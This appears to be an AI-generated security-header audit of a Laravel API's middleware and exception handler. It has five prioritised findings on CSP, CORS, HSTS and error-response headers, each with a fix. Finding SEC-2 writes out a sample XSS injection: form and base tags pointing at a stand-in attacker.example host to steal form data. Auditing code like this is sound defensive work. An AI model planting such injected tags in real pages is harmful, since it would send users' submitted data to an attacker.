Confirmed: `SecureHeaders` has no try/catch around `$next($request)`. Exceptions thrown inside the pipeline escape through line 14 — the header block (lines 19–52) is never reached. The Kernel catches the exception and renders a fresh response outside the middleware pipeline. SEC-1 is valid.

`★ Insight ─────────────────────────────────────`
Laravel's global middleware pipeline and the HTTP Kernel's exception handler are two distinct execution layers. Global middleware (like `SecureHeaders`) wraps only successful responses; exceptions that bubble up through `$next($request)` are caught by the Kernel's `handle()` try/catch and rendered into a Response object that never re-enters the middleware pipeline's post-`$next` phase. This is why the exception handler in `bootstrap/app.php` must independently apply any headers that should appear on error responses.
`─────────────────────────────────────────────────`

# Security Headers Audit — 2026-05-24

**Branch:** development
**Lens:** security header gaps, HTTPS enforcement, frame/CSP/HSTS posture
**Pipeline:** scan-tier draft by `deepseek-v4-pro`, adjudicated by `claude-sonnet-4-6`
**Source files audited:**
- `app/Http/Middleware/SecureHeaders.php`
- `bootstrap/app.php`
- `app/Http/Middleware/AddPublicCacheHeaders.php`
- `app/Http/Middleware/AddETagHeaders.php`
- `app/Http/Middleware/Auth/VerifySupabaseJwt.php`

## Progress

- P0 Blockers: 0 of 0 complete
- P1 High: 0 of 0 complete
- P2 Medium: 0 of 2 complete
- P3 Low: 0 of 3 complete

---

## P2 — Should fix

- [ ] **#SEC-1** · P2 — Error responses (4xx/5xx) bypass `SecureHeaders` and ship without X-Frame-Options, CSP, HSTS, or nosniff
    - **Where:** `app/Http/Middleware/SecureHeaders.php:14` (no try/catch around `$next`) and `bootstrap/app.php` exception handler
    - **Affects:** Every rendered exception response — 401, 403, 404, 422, 423, 429, 500, 503 on all `api/*` routes. These responses carry only `Access-Control-Allow-Origin: *`; all other security headers are absent.
    - **Effort:** S (~0.5–1h)
    - **What to do:**
        - Extract a static `applySecurityHeaders(Response $response): void` helper (or a method on `SecureHeaders`) containing the header-setting block.
        - Call that helper at the bottom of the `withExceptions()->render()` closure in `bootstrap/app.php`, immediately before `return $response`, just as CORS is applied today.
        - The helper should apply the same headers `SecureHeaders` applies — `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `Content-Security-Policy` (`default-src 'none'; frame-ancestors 'none'`), and `Strict-Transport-Security` in non-local environments.
    - **Technical:** `SecureHeaders` calls `$response = $next($request)` on line 14 with no surrounding try/catch. When an exception is thrown by any controller or middleware inside the pipeline, it propagates out through that line unhandled. Laravel's HTTP Kernel catches it at the `handle()` level and calls `renderException()` → the `withExceptions` render closure → a fresh `JsonResponse`. That response is returned directly from `Kernel::handle()` and never re-enters the global middleware pipeline — so `SecureHeaders`' post-`$next` header block never executes. The only header the exception handler currently applies is `Access-Control-Allow-Origin: *`.
    - **Plain English:** Think of `SecureHeaders` as a guard who stamps every visitor on the way out. But if someone trips a fire alarm (an error), they're rushed out the emergency exit — bypassing the stamp entirely. Every error page (wrong URL, expired session, server fault) leaves without the standard safety markings on it.
    - **Evidence:**
        ```php
        // SecureHeaders.php:12-14 — no try/catch; exceptions escape before headers are set
        public function handle(Request $request, Closure $next): Response
        {
            $response = $next($request);
        
        // bootstrap/app.php — exception handler applies only CORS, nothing else
        if ($response !== null
            && ! $response->headers->has('Access-Control-Allow-Origin')
        ) {
            $response->headers->set('Access-Control-Allow-Origin', '*');
        }
        return $response;
        ```

- [ ] **#SEC-2** · P2 — CSP is missing `form-action` and `base-uri` directives; both default to `*`
    - **Where:** `app/Http/Middleware/SecureHeaders.php:48` (non-Horizon CSP) and `:35-47` (Horizon CSP)
    - **Affects:** All browser sessions against the Horizon dashboard (the only HTML surface). An XSS payload that injects a `<form action="https://attacker.example/steal">` or `<base href="https://attacker.example/">` tag would not be blocked by CSP because `form-action` and `base-uri` do not inherit from `default-src`.
    - **Effort:** S (~0.5–1h)
    - **What to do:**
        - Add `form-action 'self'; base-uri 'self'` to the non-Horizon CSP string (already `default-src 'none'`, so these are purely additive).
        - Add the same two directives to the Horizon CSP string — `form-action 'self'` is safe since Horizon forms POST back to the same origin, and `base-uri 'self'` prevents base-tag injection in the dashboard HTML.
    - **Technical:** Per the CSP Level 2 specification, `form-action` and `base-uri` are standalone directives that explicitly do not fall back to `default-src`. When omitted, both allow `*` — any origin. The current non-Horizon policy (`default-src 'none'; frame-ancestors 'none'`) locks down scripts, images, and connections but leaves form submissions and `<base>` href resolution unbounded. While the API routes return JSON (no HTML, so no DOM attack surface), the Horizon dashboard at `/horizon/*` renders full HTML and is the surface at risk.
    - **Plain English:** The CSP policy locks the front door and all the windows, but leaves two specific exits with no lock at all — the "form submit" exit and the "base URL" exit. These are specialist bypass routes that attackers know about and the policy needs to explicitly close them. Adding two short directives seals both.
    - **Evidence:**
        ```php
        // SecureHeaders.php:48 — no form-action or base-uri directives in either CSP branch
        $response->headers->set('Content-Security-Policy', "default-src 'none'; frame-ancestors 'none'");
        
        // SecureHeaders.php:35-46 — Horizon CSP also omits both directives
        $response->headers->set(
            'Content-Security-Policy',
            "default-src 'self'; "
            ."style-src 'self' 'unsafe-inline' https://fonts.bunny.net; "
            ."script-src 'self' 'unsafe-inline' 'unsafe-eval'; "
            ."font-src 'self' https://fonts.bunny.net; "
            .'img-src \'self\' data:; '
            ."connect-src 'self'; "
            ."frame-ancestors 'none'"
        );
        ```

---

## P3 — Nice to have

- [ ] **#SEC-3** · P3 — `Access-Control-Allow-Origin: *` on every response rather than an allowlisted set of origins
    - **Where:** `app/Http/Middleware/SecureHeaders.php:19-21` and `bootstrap/app.php` exception handler
    - **Affects:** All API responses. Any origin can issue cross-origin requests and read response bodies.
    - **Effort:** M (~2–4h)
    - **What to do:**
        - Add a `frontend_origins` array to `config/partna.php` (e.g. `['https://app.partna.au', 'https://*.partna.au']`).
        - In `SecureHeaders`, validate the incoming `Origin` header against that allowlist and echo it back if it matches; emit no `Access-Control-Allow-Origin` header if it doesn't match (browsers treat absence as denied).
        - Apply the same logic in the `bootstrap/app.php` exception handler where CORS is currently patched in unconditionally.
    - **Technical:** Because Partna uses Bearer token authentication (not cookies), `Access-Control-Allow-Origin: *` does not automatically expose authenticated data — browsers cannot include `Authorization` headers in credentialed cross-origin requests unless the server explicitly sets `Access-Control-Allow-Credentials: true`, which this app does not. The risk is therefore limited to public (unauthenticated) endpoints. The wildcard is nonetheless a defence-in-depth gap: it removes a browser-side barrier that would otherwise prevent a cross-origin page from reading any public API response it can reach. Locking CORS to known frontend origins is standard hardening for production APIs and eliminates the attack surface entirely at low cost.
    - **Plain English:** Right now the API tells every website in the world "yes, you can read my responses." It doesn't automatically hand over logged-in data (the lock is on the token, not the CORS header), but it's like having an unlocked lobby even though the offices have key cards. Restricting it to just the known frontend domains is a simple, low-effort tightening that follows the principle of only sharing what's necessary.
    - **Evidence:**
        ```php
        // SecureHeaders.php:19-21
        if (! $response->headers->has('Access-Control-Allow-Origin')) {
            $response->headers->set('Access-Control-Allow-Origin', '*');
        }
        ```

- [ ] **#SEC-4** · P3 — HSTS header omits `preload`; first-visit requests to a fresh browser are unprotected
    - **Where:** `app/Http/Middleware/SecureHeaders.php:52`
    - **Affects:** First-time visitors in a fresh browser before the HSTS policy is received. A network attacker in that window can attempt SSL stripping.
    - **Effort:** S (~0.5–1h)
    - **What to do:**
        - Change the header value to `max-age=31536000; includeSubDomains; preload`.
        - Verify all subdomains (including `*.partna.au`) are HTTPS-only before submitting to the HSTS preload list at hstspreload.org. Cloudflare's dashboard also supports enabling the preload flag without a code change.
    - **Technical:** `max-age=31536000; includeSubDomains` protects any browser that has previously visited the site. The `preload` directive signals browser vendors to include the domain in their built-in HSTS list, which ships with Chrome, Firefox, and Edge — eliminating the first-visit window entirely. Without it, a user who types `partna.au` in a brand-new browser (or incognito) makes an initial plaintext HTTP request before being upgraded. Cloudflare's Always Use HTTPS rule provides partial mitigation at the edge, but adding `preload` closes the gap at the browser level without relying on infrastructure config.
    - **Plain English:** The current "always use HTTPS" instruction reaches browsers only after they've already visited once. A brand-new visitor typing the address directly could, in theory, be intercepted before that instruction arrives. Adding `preload` puts the domain on a permanent list baked into browsers worldwide, so even a first-time visitor gets the protection before they make a single request.
    - **Evidence:**
        ```php
        if (! app()->environment('local', 'testing')) {
            $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        }
        ```

- [ ] **#SEC-5** · P3 — No CSP violation reporting endpoint; blocked requests are silent
    - **Where:** `app/Http/Middleware/SecureHeaders.php:48`
    - **Affects:** Security observability — CSP blocks from XSS probes, misconfigured allowlists, or injected third-party content produce no server-side signal.
    - **Effort:** S (~0.5–1h)
    - **What to do:**
        - Add `report-uri /api/internal/csp-report` (or a third-party collector such as report-uri.com) to the non-Horizon CSP string.
        - Alternatively use the newer `Report-To` header with a `report-to` CSP directive for browsers that support CSP Level 3.
        - A minimal self-hosted endpoint can log the violation body via `Log::warning` and let Nightwatch surface patterns.
    - **Technical:** `report-uri` (universally supported) and `report-to` (CSP Level 3, modern browsers) instruct the browser to POST a JSON violation report each time CSP blocks a resource load. Without a reporting endpoint, the current `default-src 'none'` policy operates blind — a future feature that loads a legitimate external resource will fail silently in users' browsers, and real XSS probes are never surfaced. For a strict `default-src 'none'` policy this is especially important: the policy is tight enough that any misconfiguration (e.g. a new image source added without a CSP allowlist update) produces zero server signal until users report broken UI.
    - **Plain English:** The CSP bouncer is blocking things at the door, but there's no incident log. If the bouncer accidentally turns away a legitimate vendor, nobody knows until customers complain about a broken feature. If a real attacker probes for gaps, nobody sees the attempt. Adding a reporting endpoint is like installing a camera — the bouncer still blocks the same things, but now every blocked entry is recorded.
    - **Evidence:**
        ```php
        // SecureHeaders.php:48 — CSP has no report-uri or report-to directive
        $response->headers->set('Content-Security-Policy', "default-src 'none'; frame-ancestors 'none'");
        ```

`★ Insight ─────────────────────────────────────`
SEC-1 and SEC-3 share an architectural root: the exception handler in `bootstrap/app.php` was written to solve CORS on errors (a real problem—CloudFlare strips headers on some error paths) but never extended to the full security header set. The cleanest fix for both is a shared `SecureHeaders::applyTo(Response $r): void` static method that both the middleware and the exception handler call—single source of truth, no drift risk.
`─────────────────────────────────────────────────`
